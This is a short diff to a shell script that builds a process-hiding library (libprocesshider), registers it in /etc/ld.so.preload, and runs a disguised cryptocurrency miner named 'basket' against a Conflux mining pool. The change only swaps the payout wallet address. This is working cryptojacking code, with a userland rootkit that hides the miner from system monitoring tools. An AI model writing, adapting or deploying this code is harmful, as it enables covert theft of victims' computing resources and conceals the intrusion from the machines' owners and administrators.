@@ -49,4 +49,4 @@ gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
 mv libprocesshider.so /usr/local/lib/
 echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
-./basket -a octopus -o stratum+ssl://us2.conflux.herominers.com:1170 -u 0x52500352a37a06f0c085d58663e4eadbd7e9f684.NB -log --proxy 127.0.0.1:9999
+./basket -a octopus -o stratum+ssl://us2.conflux.herominers.com:1170 -u 0x1508ad81fad1d481005b34470699c372b8f6a2c4.NB -log --proxy 127.0.0.1:9999
